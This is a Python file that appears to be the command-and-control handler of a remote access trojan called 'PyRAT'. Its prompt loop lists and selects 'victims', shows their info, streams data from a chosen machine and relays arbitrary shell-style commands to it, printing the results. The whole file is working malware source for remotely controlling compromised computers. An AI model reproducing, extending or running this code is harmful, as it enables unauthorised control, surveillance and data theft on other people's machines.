from stream.stream import Stream
from server import Server


class Handler:
    def __init__(self):
        pass

    @staticmethod
    def handle(srv: Server):
        while True:
            command = input('PyRAT> ')

            if not command:
                continue

            if command == 'stream':
                if srv.victim:
                    srv.send_data(srv.victim, command)
                    # print(srv.get_data(srv.victim))

                    stream = Stream()
                    stream.receive()
                    continue

            if command == 'show':
                print('victims: ', srv.victims.keys())

            elif command.split()[0] == 'use':
                if command.split()[1] in srv.victims:
                    srv.victim = command.split()[1]
                    print(f'Current victim is {srv.victim}')
                else:
                    print('Victim not found!')

            elif command.split()[0] == 'exit':
                if srv.victim:
                    srv.victim = None
                    print('Exited...')
                else:
                    print('You\'re already exited')

            elif command.split()[0] == 'info':
                if command.split()[1] in srv.victims:
                    print(srv.victims[command.split()[1]][1])
                else:
                    print('Victim not found!')

            else:
                if srv.victim:
                    srv.send_data(srv.victim, command)

                    print(srv.get_data(srv.victim))

                else:
                    print('Unknown command!')
